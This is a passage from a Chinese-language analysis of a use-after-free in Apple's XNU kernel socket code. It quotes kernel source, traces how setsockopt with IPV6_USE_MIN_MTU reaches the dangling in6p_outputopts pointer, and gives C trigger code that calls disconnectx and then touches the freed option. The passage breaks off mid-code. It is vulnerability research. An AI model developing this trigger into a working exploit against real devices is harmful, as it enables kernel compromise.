                inp->inp_options = NULL;
            }
            im6o = inp->in6p_moptions;
            inp->in6p_moptions = NULL;
            imo = inp->inp_moptions;
            inp->inp_moptions = NULL;
            sofreelastref(so, 0);
            inp->inp_state = INPCB_STATE_DEAD;
            /* makes sure we're not called twice from so_close */
            so->so_flags |= SOF_PCBCLEARING;
            inpcb_gc_sched(inp->inp_pcbinfo, INPCB_TIMER_FAST);
            /*
             * See inp_join_group() for why we need to unlock
             */
            if (im6o != NULL || imo != NULL) {
                socket_unlock(so, 0);
                if (im6o != NULL)
                    IM6O_REMREF(im6o);
                if (imo != NULL)
                    IMO_REMREF(imo);
                socket_lock(so, 0);
            }
        }
    }
跟到这里我只能说Socket实在是太庞大了！
## 3\. 探索漏洞触发路径
从漏洞分析可以看到这个漏洞函数是可以从用户态进行调用的
    448    AUE_NULL    ALL    { int disconnectx(int s, sae_associd_t aid, sae_connid_t cid); }
所以最基本的调用代码如下，调用完函数`disconnectx()`之后，我们就获得了一个存在漏洞的结构体变量`tcp_sock`
    int main(int argc, char * argv[]) {
        int tcp_sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
        disconnectx(tcp_sock, 0, 0);
    }
我们知道，UAF漏洞的一个关键点在于释放掉的一个指针后续被继续使用，那我们如何使用一个被关闭后的Socket呢？
Socket有两个属性读写函数`getsockopt()`和`setsockopt()`，两个函数的原型如下
    105    AUE_SETSOCKOPT    ALL    { int setsockopt(int s, int level, int name, caddr_t val, socklen_t valsize); } 
    118    AUE_GETSOCKOPT    ALL    { int getsockopt(int s, int level, int name, caddr_t val, socklen_t *avalsize); }
函数`setsockopt()`的第一个参数是Socket变量，第二个参数有多个选择，看操作的层级，第三个是操作的选项名，这个选项名跟第二个参数`level`有关，第四个参数是新选项值的指针，第五个参数是第四个参数的大小
    #define IPV6_USE_MIN_MTU 42
    int get_minmtu(int sock, int *minmtu) {
        socklen_t size = sizeof(*minmtu);
        return getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);
    }
    int main(int argc, char * argv[]) {
        int tcp_sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
        // SOPT_SET
        int minmtu = -1;
        setsockopt(tcp_sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, sizeof(minmtu));
        // SOPT_GET
        int mtu;
        get_minmtu(tcp_sock, &mtu);
        NSLog(@"%d\n", mtu);
    }
为什么第二个参数和第三个参数要设置成`IPPROTO_IPV6`和`IPV6_USE_MIN_MTU`？
这就要先来看最开始那个没有被置为`NULL`的结构体成员`inp->in6p_outputopts`了，这个成员的结构体定义如下
    struct    ip6_pktopts {
        struct    mbuf *ip6po_m;    /* Pointer to mbuf storing the data */
        int    ip6po_hlim;    /* Hoplimit for outgoing packets */
        /* Outgoing IF/address information */
        struct    in6_pktinfo *ip6po_pktinfo;
        /* Next-hop address information */
        struct    ip6po_nhinfo ip6po_nhinfo;
        struct    ip6_hbh *ip6po_hbh; /* Hop-by-Hop options header */
        /* Destination options header (before a routing header) */
        struct    ip6_dest *ip6po_dest1;
        /* Routing header related info. */
        struct    ip6po_rhinfo ip6po_rhinfo;
        /* Destination options header (after a routing header) */
        struct    ip6_dest *ip6po_dest2;
        int    ip6po_tclass;    /* traffic class */
        int    ip6po_minmtu;  /* fragment vs PMTU discovery policy */
    #define    IP6PO_MINMTU_MCASTONLY    -1 /* default; send at min MTU for multicast */
    #define    IP6PO_MINMTU_DISABLE     0 /* always perform pmtu disc */
    #define    IP6PO_MINMTU_ALL     1 /* always send at min MTU */
        /* whether temporary addresses are preferred as source address */
        int    ip6po_prefer_tempaddr;
    #define    IP6PO_TEMPADDR_SYSTEM    -1 /* follow the system default */
    #define    IP6PO_TEMPADDR_NOTPREFER 0 /* not prefer temporary address */
    #define    IP6PO_TEMPADDR_PREFER     1 /* prefer temporary address */
        int ip6po_flags;
    #if 0    /* parameters in this block is obsolete. do not reuse the values. */
    #define    IP6PO_REACHCONF    0x01    /* upper-layer reachability confirmation. */
    #define    IP6PO_MINMTU    0x02    /* use minimum MTU (IPV6_USE_MIN_MTU) */
    #endif
    #define    IP6PO_DONTFRAG        0x04    /* no fragmentation (IPV6_DONTFRAG) */
    #define    IP6PO_USECOA        0x08    /* use care of address */
    };
无论是`set*()`还是`get*()`，最后都肯定是要通过一个`case`判断再操作到结构体成员的
源码搜索`IPV6_USE_MIN_MTU`，在函数`ip6_getpcbopt`发现一段符合我们所说特征的代码，可见选项`IPV6_USE_MIN_MTU`操作的结构体成员是`ip6_pktopts->ip6po_minmtu`
    static int
    ip6_setpktopt(int optname, u_char *buf, int len, struct ip6_pktopts *opt,
        int sticky, int cmsg, int uproto)
    {
        ...
        switch (optname) {
        ...
        case IPV6_USE_MIN_MTU:
            if (len != sizeof (int))
                return (EINVAL);
            minmtupolicy = *(int *)(void *)buf;
            if (minmtupolicy != IP6PO_MINMTU_MCASTONLY &&
                minmtupolicy != IP6PO_MINMTU_DISABLE &&
                minmtupolicy != IP6PO_MINMTU_ALL) {
                return (EINVAL);
            }
            opt->ip6po_minmtu = minmtupolicy;    // 赋值操作
            break;
函数`ip6_setpktopts()`和函数`ip6_pcbopt()`都调用到了函数`ip6_setpktopt()`，但前者的调用逻辑不符合，所以确定调用者是函数`ip6_pcbopt`
    static int
    ip6_pcbopt(int optname, u_char *buf, int len, struct ip6_pktopts **pktopt,
        int uproto)
    {
        struct ip6_pktopts *opt;
        opt = *pktopt;
        if (opt == NULL) {
            opt = _MALLOC(sizeof (*opt), M_IP6OPT, M_WAITOK);
            if (opt == NULL)
                return (ENOBUFS);
            ip6_initpktopts(opt);
            *pktopt = opt;
        }
        return (ip6_setpktopt(optname, buf, len, opt, 1, 0, uproto));
    }
在函数`ip6_ctloutput()`里，当`optname`为`IPV6_USE_MIN_MTU`的时候调用函数`ip6_pcbopt()`
    int
    ip6_ctloutput(struct socket *so, struct sockopt *sopt)
    {
        ...
        if (level == IPPROTO_IPV6) {
            boolean_t capture_exthdrstat_in = FALSE;
            switch (op) {
            case SOPT_SET:
                switch (optname) {
                ...
                case IPV6_TCLASS:
                case IPV6_DONTFRAG:
                case IPV6_USE_MIN_MTU:
                case IPV6_PREFER_TEMPADDR: {
                    ...
                    optp = &in6p->in6p_outputopts;
                    error = ip6_pcbopt(optname, (u_char *)&optval,
                        sizeof (optval), optp, uproto);
                    ...
                    break;
                }
函数`rip6_ctloutput()`做了`SOPT_SET`和`SOPT_GET`的判断，`IPV6_USE_MIN_MTU`会走`default`分支调用函数`ip6_ctloutput()`
    int
    rip6_ctloutput(
        struct socket *so,
        struct sockopt *sopt)
    {
        ...
        switch (sopt->sopt_dir) {
        case SOPT_GET:
        ...
        case SOPT_SET:
            switch (sopt->sopt_name) {
            case IPV6_CHECKSUM:
                error = ip6_raw_ctloutput(so, sopt);
                break;
            case SO_FLUSH:
                if ((error = sooptcopyin(sopt, &optval, sizeof (optval),
                    sizeof (optval))) != 0)
                    break;
                error = inp_flush(sotoinpcb(so), optval);
                break;
            default:
                error = ip6_ctloutput(so, sopt);    // 选项名为IPV6_USE_MIN_MTU
                break;
            }
            break;
        }
        return (error);
    }
函数`rip6_ctloutput()`并不是常规的层层调用回去，而是使用结构体赋值的形式进行调用
    {
        ...
        .pr_ctloutput =        rip6_ctloutput,
    }
这个也简单，直接搜索`->pr_ctloutput`，当`level`不是`SOL_SOCKET`的时候，就调用函数`rip6_ctloutput()`
    int
    sosetoptlock(struct socket *so, struct sockopt *sopt, int dolock)
    {
        ...
        if ((so->so_state & (SS_CANTRCVMORE | SS_CANTSENDMORE)) ==
            (SS_CANTRCVMORE | SS_CANTSENDMORE) &&
            (so->so_flags & SOF_NPX_SETOPTSHUT) == 0) {
            /* the socket has been shutdown, no more sockopt's */
            error = EINVAL;
            goto out;
        }
        ...
        if (sopt->sopt_level != SOL_SOCKET) {
            if (so->so_proto != NULL &&
                so->so_proto->pr_ctloutput != NULL) {
                error = (*so->so_proto->pr_ctloutput)(so, sopt);
                goto out;
            }
            error = ENOPROTOOPT;
        } else {
最后回到最早的调用函数`setsockopt()`
    int
    setsockopt(struct proc *p, struct setsockopt_args *uap,
        __unused int32_t *retval)
    {
        struct socket *so;
        struct sockopt sopt;
        int error;
        AUDIT_ARG(fd, uap->s);
        if (uap->val == 0 && uap->valsize != 0)
            return (EFAULT);
        /* No bounds checking on size (it's unsigned) */
        error = file_socket(uap->s, &so);
        if (error)
            return (error);
        sopt.sopt_dir = SOPT_SET;
        sopt.sopt_level = uap->level;
        sopt.sopt_name = uap->name;
        sopt.sopt_val = uap->val;
        sopt.sopt_valsize = uap->valsize;
        sopt.sopt_p = p;
        if (so == NULL) {
            error = EINVAL;
            goto out;
        }
    #if CONFIG_MACF_SOCKET_SUBSET
        if ((error = mac_socket_check_setsockopt(kauth_cred_get(), so,
            &sopt)) != 0)
            goto out;
    #endif /* MAC_SOCKET_SUBSET */
        error = sosetoptlock(so, &sopt, 1);    /* will lock socket */
    out:
        file_drop(uap->s);
        return (error);
    }
以上为参数`IPPROTO_IPV6`和`IPV6_USE_MIN_MTU`的由来
但记住，现在是Socket还正常存在的情况，如果调用了函数`disconnectx()`呢？
Socket被关闭了还能操作吗？
    #define IPV6_USE_MIN_MTU 42
    int get_minmtu(int sock, int *minmtu) {
        socklen_t size = sizeof(*minmtu);
        return getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);
    }
    int main(int argc, char * argv[]) {
        int tcp_sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
        // SOPT_SET
        int minmtu = -1;